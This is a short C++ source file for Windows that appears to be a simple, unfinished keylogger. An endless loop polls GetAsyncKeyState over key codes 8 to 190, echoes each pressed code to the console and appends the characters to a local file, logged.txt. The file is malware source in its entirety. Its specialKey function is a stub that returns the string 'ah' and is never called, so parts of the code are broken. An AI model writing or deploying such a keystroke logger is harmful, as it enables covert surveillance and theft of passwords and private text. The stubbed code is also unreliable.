#include <windows.h>
#include <iostream>
#include <fstream>

#define FILE_NAME "logged.txt"

void fileData(std::string data) {
    std::fstream log_file;
    //Create the file. If the file exists, append to it instead of erasing.
    log_file.open(FILE_NAME, std::ios::app);
    //put keystrokes into text file
    log_file << data;
    //Close the file
    log_file.close();
}

std::string specialKey(int keyPressed) {
    //Space
    //Enter
    //Tab
    //Caps Lock
    //Back Space
    //Shift
    //Control
    //Alt
    return "ah";
}

int main() {
    //loop forever
    while(true){
         //Loop through each key using Virtual-Key Codes.
        //Start at 8 and go to 190 since the rest of the key codes can vary
        for(int keyCode=8; keyCode<=190; keyCode++) {
            //Check if the key is pressed
            if(GetAsyncKeyState(keyCode)) {
                std::cout << keyCode << std::endl;
                //Fills the string with 1 of the character array.
                fileData(std::string(1, char(keyCode)));
            }
            //If its a special key, translate it
        }
    }
    
    return 1;
}